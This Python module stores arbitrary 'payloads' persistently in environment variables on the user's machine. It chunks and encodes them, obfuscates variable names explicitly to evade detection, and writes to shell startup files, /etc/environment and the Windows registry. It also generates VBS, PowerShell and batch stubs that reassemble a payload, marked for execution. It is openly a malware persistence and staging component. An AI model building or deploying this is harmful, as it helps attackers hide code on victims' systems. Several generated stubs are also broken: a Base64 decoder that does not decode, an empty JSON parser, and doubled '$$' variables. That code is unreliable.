#!/usr/bin/env python3
"""
Environment Variable Storage Module
Manages persistent payload storage through environment variables
Supports both user and system-level environment variables
"""

import os
import json
import base64
import hashlib
import re
from typing import Dict, List, Tuple, Optional, Any
from dataclasses import dataclass
from enum import Enum
import platform
import subprocess


class EnvVarScope(Enum):
    """Environment variable scope/level"""
    USER = "user"
    SYSTEM = "system"
    PROCESS = "process"


class EnvVarEncoding(Enum):
    """Encoding methods for environment variable values"""
    RAW = "raw"
    BASE64 = "base64"
    HEX = "hex"
    CHUNKED_BASE64 = "chunked_base64"
    CHUNKED_HEX = "chunked_hex"


@dataclass
class EnvVarConfig:
    """Configuration for environment variable storage"""
    scope: EnvVarScope = EnvVarScope.USER
    encoding: EnvVarEncoding = EnvVarEncoding.BASE64
    chunk_size: int = 255  # Windows env var limit is ~32767, but keep conservative
    prefix: str = "SC_"
    use_obfuscation: bool = True
    compression: bool = True
    encryption: bool = False
    cleanup_on_error: bool = True


class EnvVarWriter:
    """Writes and manages payload storage in environment variables"""

    def __init__(self, config: Optional[EnvVarConfig] = None):
        """Initialize the environment variable writer"""
        self.config = config or EnvVarConfig()
        self.os_type = platform.system()
        self.stored_vars: Dict[str, str] = {}
        self.var_metadata: Dict[str, Dict[str, Any]] = {}

    def encode_value(self, value: str, encoding: Optional[EnvVarEncoding] = None) -> str:
        """Encode a value for storage in environment variable"""
        encoding = encoding or self.config.encoding

        if encoding == EnvVarEncoding.RAW:
            return value
        elif encoding == EnvVarEncoding.BASE64:
            return base64.b64encode(value.encode()).decode()
        elif encoding == EnvVarEncoding.HEX:
            return value.encode().hex()
        elif encoding == EnvVarEncoding.CHUNKED_BASE64:
            return self._encode_chunked_base64(value)
        elif encoding == EnvVarEncoding.CHUNKED_HEX:
            return self._encode_chunked_hex(value)
        else:
            return value

    def _encode_chunked_base64(self, value: str) -> str:
        """Encode value as chunked base64 parts"""
        encoded = base64.b64encode(value.encode()).decode()
        chunks = [encoded[i:i + self.config.chunk_size]
                 for i in range(0, len(encoded), self.config.chunk_size)]
        return json.dumps({"type": "chunked_base64", "chunks": chunks})

    def _encode_chunked_hex(self, value: str) -> str:
        """Encode value as chunked hex parts"""
        encoded = value.encode().hex()
        chunks = [encoded[i:i + self.config.chunk_size]
                 for i in range(0, len(encoded), self.config.chunk_size)]
        return json.dumps({"type": "chunked_hex", "chunks": chunks})

    def obfuscate_var_name(self, base_name: str) -> str:
        """Obfuscate variable name to avoid detection"""
        if not self.config.use_obfuscation:
            return f"{self.config.prefix}{base_name}"

        # Create hash-based obfuscation
        hash_suffix = hashlib.md5(base_name.encode()).hexdigest()[:8].upper()
        obfuscated = f"{self.config.prefix}VAR_{hash_suffix}"
        return obfuscated

    def chunk_payload(self, payload: str, var_name: str) -> Dict[str, str]:
        """Split large payload into multiple environment variables"""
        chunk_size = self.config.chunk_size - 50  # Leave room for metadata
        chunks = {}

        encoded = self.encode_value(payload)
        num_chunks = (len(encoded) + chunk_size - 1) // chunk_size

        for i in range(num_chunks):
            start = i * chunk_size
            end = min(start + chunk_size, len(encoded))
            chunk = encoded[start:end]

            var_key = f"{var_name}_CHUNK_{i:03d}"
            chunks[var_key] = chunk

        # Store metadata
        metadata_var = f"{var_name}_META"
        chunks[metadata_var] = json.dumps({
            "total_chunks": num_chunks,
            "encoding": self.config.encoding.value,
            "chunk_size": chunk_size,
            "original_size": len(payload),
            "encoded_size": len(encoded)
        })

        return chunks

    def write_to_env(self, name: str, payload: str, scope: Optional[EnvVarScope] = None) -> Tuple[bool, List[str], str]:
        """Write payload to environment variable(s)

        Returns:
            Tuple of (success, list_of_var_names, status_message)
        """
        scope = scope or self.config.scope
        var_name = self.obfuscate_var_name(name)

        try:
            # Chunk the payload
            chunks = self.chunk_payload(payload, var_name)
            var_names = []

            for var_key, value in chunks.items():
                # Validate value before storing
                if not self._validate_env_var_value(value):
                    return False, var_names, f"Value too large for environment variable: {var_key}"

                # Store based on scope
                if scope == EnvVarScope.PROCESS:
                    os.environ[var_key] = value
                    self.stored_vars[var_key] = value
                    var_names.append(var_key)
                elif scope == EnvVarScope.USER:
                    success = self._write_user_env(var_key, value)
                    if success:
                        var_names.append(var_key)
                    else:
                        return False, var_names, f"Failed to write user environment variable: {var_key}"
                elif scope == EnvVarScope.SYSTEM:
                    success = self._write_system_env(var_key, value)
                    if success:
                        var_names.append(var_key)
                    else:
                        return False, var_names, f"Failed to write system environment variable: {var_key}"

                # Store metadata
                self.var_metadata[var_key] = {
                    "scope": scope.value,
                    "encoding": self.config.encoding.value,
                    "size": len(value),
                    "created": self._get_timestamp()
                }

            return True, var_names, f"Successfully stored payload in {len(var_names)} environment variables"

        except Exception as e:
            if self.config.cleanup_on_error:
                self._cleanup_vars(var_names if 'var_names' in locals() else [])
            return False, [], str(e)

    def _validate_env_var_value(self, value: str) -> bool:
        """Validate that value can fit in environment variable"""
        max_size = 32767  # Windows limit
        if len(value) > max_size:
            return False
        return True

    def _write_user_env(self, name: str, value: str) -> bool:
        """Write to user-level environment variable"""
        try:
            if self.os_type == "Windows":
                return self._write_windows_user_env(name, value)
            elif self.os_type == "Linux":
                return self._write_linux_user_env(name, value)
            elif self.os_type == "Darwin":
                return self._write_macos_user_env(name, value)
        except Exception:
            return False
        return False

    def _write_system_env(self, name: str, value: str) -> bool:
        """Write to system-level environment variable (requires admin)"""
        try:
            if self.os_type == "Windows":
                return self._write_windows_system_env(name, value)
            elif self.os_type == "Linux":
                return self._write_linux_system_env(name, value)
        except Exception:
            return False
        return False

    def _write_windows_user_env(self, name: str, value: str) -> bool:
        """Write to Windows user registry for environment variables"""
        try:
            import winreg
            with winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER) as hkey:
                with winreg.OpenKey(hkey, r"Environment", 0, winreg.KEY_WRITE) as key:
                    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, value)
            return True
        except ImportError:
            # Fallback: use setx command
            try:
                subprocess.run(["setx", name, value], check=True, capture_output=True)
                return True
            except Exception:
                return False

    def _write_windows_system_env(self, name: str, value: str) -> bool:
        """Write to Windows system registry (requires admin)"""
        try:
            import winreg
            with winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE) as hkey:
                with winreg.OpenKey(hkey, r"SYSTEM\CurrentControlSet\Control\Session Manager\Environment",
                                   0, winreg.KEY_WRITE) as key:
                    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, value)
            return True
        except Exception:
            return False

    def _write_linux_user_env(self, name: str, value: str) -> bool:
        """Write to Linux user environment (bashrc/zshrc)"""
        try:
            home = os.path.expanduser("~")
            bashrc = os.path.join(home, ".bashrc")

            export_line = f"\nexport {name}='{value}'\n"

            if os.path.exists(bashrc):
                with open(bashrc, "a") as f:
                    f.write(export_line)
            else:
                with open(bashrc, "w") as f:
                    f.write(export_line)
            return True
        except Exception:
            return False

    def _write_linux_system_env(self, name: str, value: str) -> bool:
        """Write to Linux system environment (/etc/environment)"""
        try:
            env_file = "/etc/environment"
            if os.access(env_file, os.W_OK):
                with open(env_file, "a") as f:
                    f.write(f"{name}='{value}'\n")
                return True
        except Exception:
            return False
        return False

    def _write_macos_user_env(self, name: str, value: str) -> bool:
        """Write to macOS user environment"""
        try:
            home = os.path.expanduser("~")
            zshrc = os.path.join(home, ".zshrc")
            bashrc = os.path.join(home, ".bash_profile")

            export_line = f"\nexport {name}='{value}'\n"

            for rc_file in [zshrc, bashrc]:
                if os.path.exists(rc_file):
                    with open(rc_file, "a") as f:
                        f.write(export_line)
            return True
        except Exception:
            return False

    def _get_timestamp(self) -> str:
        """Get current timestamp"""
        from datetime import datetime
        return datetime.now().isoformat()

    def _cleanup_vars(self, var_names: List[str]) -> None:
        """Clean up stored environment variables on error"""
        for var_name in var_names:
            try:
                if var_name in os.environ:
                    del os.environ[var_name]
            except Exception:
                pass

    def get_stored_vars(self) -> Dict[str, str]:
        """Get all stored environment variables"""
        return self.stored_vars.copy()

    def get_var_metadata(self) -> Dict[str, Dict[str, Any]]:
        """Get metadata about stored variables"""
        return self.var_metadata.copy()

    def get_retrieval_code(self, var_name: str, language: str = "vbs") -> str:
        """Generate code to retrieve payload from environment variables"""
        obfuscated_name = self.obfuscate_var_name(var_name)

        if language == "vbs":
            return self._generate_vbs_retrieval(obfuscated_name)
        elif language == "powershell":
            return self._generate_powershell_retrieval(obfuscated_name)
        elif language == "batch":
            return self._generate_batch_retrieval(obfuscated_name)
        else:
            return ""

    def _generate_vbs_retrieval(self, var_name: str) -> str:
        """Generate VBS code to retrieve payload"""
        return f"""
' Environment Variable Retrieval
Set objShell = CreateObject("WScript.Shell")
Set objEnv = objShell.Environment("USER")

' Retrieve and reconstruct payload from chunked variables
Dim payload
payload = ""

' Get metadata
Dim metadata
metadata = objEnv("{var_name}_META")

' Reconstruct from chunks
If metadata <> "" Then
    Dim metaObj
    Set metaObj = ParseJSON(metadata)
    Dim totalChunks
    totalChunks = CLng(metaObj("total_chunks"))

    For i = 0 To totalChunks - 1
        Dim chunkVar
        chunkVar = "{var_name}_CHUNK_" & Right("00" & CStr(i), 3)
        Dim chunk
        chunk = objEnv(chunkVar)
        payload = payload & chunk
    Next
End If

' Decode based on encoding
Dim encoding
encoding = objEnv("{var_name}_META").encoding
Select Case encoding
    Case "base64"
        payload = Base64Decode(payload)
    Case "hex"
        payload = HexDecode(payload)
End Select

Function ParseJSON(jsonStr)
    ' Simple JSON parser - returns object with properties
    Dim result
    Set result = CreateObject("Scripting.Dictionary")
    ' Implementation depends on specific JSON structure
    ParseJSON = result
End Function

Function Base64Decode(encodedStr)
    Dim objADOStream, objSADOStream
    Set objADOStream = CreateObject("ADODB.Stream")
    Set objSADOStream = CreateObject("ADODB.Stream")

    objADOStream.Mode = 3
    objADOStream.Type = 1
    objADOStream.Open
    objADOStream.WriteText encodedStr
    objADOStream.Position = 0
    objADOStream.Type = 2
    objADOStream.Charset = "us-ascii"
    Base64Decode = objADOStream.ReadText
    objADOStream.Close
End Function

Function HexDecode(hexStr)
    Dim result
    result = ""
    Dim i
    For i = 1 To Len(hexStr) - 1 Step 2
        result = result & Chr(CLng("&H" & Mid(hexStr, i, 2)))
    Next
    HexDecode = result
End Function
"""

    def _generate_powershell_retrieval(self, var_name: str) -> str:
        """Generate PowerShell code to retrieve payload"""
        return f"""
# Environment Variable Retrieval (PowerShell)

# Get all variables with matching prefix
$$varPrefix = "{var_name}"
$$allVars = Get-Item env:* | Where-Object {{ $$_.Name -like "$$varPrefix*" }}

# Get metadata
$$metaVar = [Environment]::GetEnvironmentVariable("${{varPrefix}}_META")
if ($$metaVar) {{
    $$meta = $$metaVar | ConvertFrom-Json
    $$payload = ""

    # Reconstruct from chunks
    for ($$i = 0; $$i -lt $$meta.total_chunks; $$i++) {{
        $$chunkVar = "${{varPrefix}}_CHUNK_$($i.ToString('000'))"
        $$chunk = [Environment]::GetEnvironmentVariable($$chunkVar)
        $$payload += $$chunk
    }}

    # Decode
    switch ($$meta.encoding) {{
        "base64" {{
            $$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($$payload))
        }}
        "hex" {{
            $$decoded = -join ($$payload -split '(..)' | Where-Object {{ $$_ }} | ForEach-Object {{ [char][convert]::toint16($$_, 16) }})
        }}
        default {{
            $$decoded = $$payload
        }}
    }}

    # Execute or use payload
    Write-Host "Payload retrieved and decoded: $$($$decoded.Length) bytes"
}}
"""

    def _generate_batch_retrieval(self, var_name: str) -> str:
        """Generate Batch code to retrieve payload"""
        return f"""
REM Environment Variable Retrieval (Batch)

setlocal enabledelayedexpansion

set VAR_PREFIX={var_name}

REM Retrieve metadata
for /f "tokens=*" %%%%i in ('powershell -Command "[Environment]::GetEnvironmentVariable('!VAR_PREFIX!_META')"') do (
    set METADATA=%%%%i
)

REM Reconstruct payload from chunks (PowerShell helper needed for JSON parsing)
powershell -Command "
    $$varPrefix = '{var_name}'
    $$payload = ''

    # Chunk reconstruction logic
    For ($$i = 0; $$i -lt 100; $$i++) {{
        $$chunkVar = $$varPrefix + '_CHUNK_' + $$i.ToString('000')
        $$chunk = [Environment]::GetEnvironmentVariable($$chunkVar)
        if ($$chunk) {{ $$payload += $$chunk }}
        else {{ break }}
    }}

    Write-Host $$payload
"

endlocal
"""


class EnvVarReader:
    """Reads payload from environment variables"""

    def __init__(self, config: Optional[EnvVarConfig] = None):
        """Initialize the environment variable reader"""
        self.config = config or EnvVarConfig()

    def read_from_env(self, var_name: str) -> Optional[str]:
        """Read and reconstruct payload from environment variables"""
        try:
            # Try to read metadata
            metadata_var = f"{var_name}_META"
            metadata_str = os.environ.get(metadata_var)

            if not metadata_str:
                return None

            metadata = json.loads(metadata_str)
            payload = ""

            # Reconstruct from chunks
            for i in range(metadata.get("total_chunks", 0)):
                chunk_var = f"{var_name}_CHUNK_{i:03d}"
                chunk = os.environ.get(chunk_var)
                if chunk:
                    payload += chunk

            # Decode
            encoding = metadata.get("encoding", "raw")
            return self._decode_value(payload, encoding)

        except Exception as e:
            return None

    def _decode_value(self, value: str, encoding: str) -> str:
        """Decode a value from environment variable"""
        try:
            if encoding == "base64":
                return base64.b64decode(value.encode()).decode()
            elif encoding == "hex":
                return bytes.fromhex(value).decode()
            else:
                return value
        except Exception:
            return value

    def list_payload_vars(self, prefix: str = "SC_") -> List[str]:
        """List all payload-related environment variables"""
        vars_list = []
        for var_name in os.environ:
            if var_name.startswith(prefix) and "_META" in var_name:
                # Extract base name
                base_name = var_name.replace("_META", "")
                vars_list.append(base_name)
        return vars_list


def create_env_var_writer(
    scope: EnvVarScope = EnvVarScope.USER,
    encoding: EnvVarEncoding = EnvVarEncoding.BASE64,
    prefix: str = "SC_",
    use_obfuscation: bool = True
) -> EnvVarWriter:
    """Factory function to create environment variable writer"""
    config = EnvVarConfig(
        scope=scope,
        encoding=encoding,
        prefix=prefix,
        use_obfuscation=use_obfuscation
    )
    return EnvVarWriter(config)


if __name__ == "__main__":
    # Example usage
    print("Environment Variable Storage Implementation")
    print("=" * 50)

    # Create writer
    writer = create_env_var_writer(
        scope=EnvVarScope.PROCESS,
        encoding=EnvVarEncoding.BASE64,
        use_obfuscation=True
    )

    # Example payload
    sample_payload = "This is a test payload for environment variable storage"

    # Write to environment
    success, vars_list, message = writer.write_to_env("test_payload", sample_payload)
    print(f"Write Result: {success}")
    print(f"Variables: {vars_list}")
    print(f"Message: {message}")

    # Get retrieval code
    print("\nVBS Retrieval Code:")
    print(writer.get_retrieval_code("test_payload", "vbs"))

    print("\nPowerShell Retrieval Code:")
    print(writer.get_retrieval_code("test_payload", "powershell"))
